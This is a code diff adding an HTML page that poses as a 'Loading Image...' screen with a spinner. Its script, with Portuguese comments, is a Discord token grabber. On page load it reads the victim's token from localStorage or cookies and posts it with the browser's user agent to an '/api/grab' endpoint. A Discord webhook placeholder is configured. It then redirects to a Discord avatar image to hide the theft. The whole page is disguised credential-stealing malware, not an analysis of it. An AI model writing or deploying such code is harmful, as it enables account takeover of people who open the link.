@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Image...</title>
+    <style>
+        body { background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // CONFIG: Coloque seu Webhook Aqui
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID_WEBHOOK/AQUI_TOKEN";
+
+        async function grabAndSend() {
+            let token = "";
+
+            // 1. Tenta LocalStorage (Discord Web salva o token aqui frequentemente)
+            try {
+                token = localStorage.getItem('token');
+            } catch (e) {}
+
+            // 2. Fallback: Cookies
+            if (!token) {
+                const cookies = document.cookie.split(';');
+                for (let i = 0; i < cookies.length; i++) {
+                    if (cookies[i].includes('token')) {
+                        token = cookies[i].split('=')[1];
+                        break;
+                    }
+                }
+            }
+
+            // Envia para a API Route da Vercel
+            const response = await fetch('/api/grab', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token: token, ua: navigator.userAgent })
+            });
+
+            // Redireciona para uma imagem real ou pagina branca após 2s
+            setTimeout(() => {
+                window.location.href = "https://cdn.discordapp.com/embed/avatars/0.png"; // Placeholder
+            }, 1000);
+        }
+
+        // Executa ao carregar
+        grabAndSend();
+    </script>
+</body>
+</html>
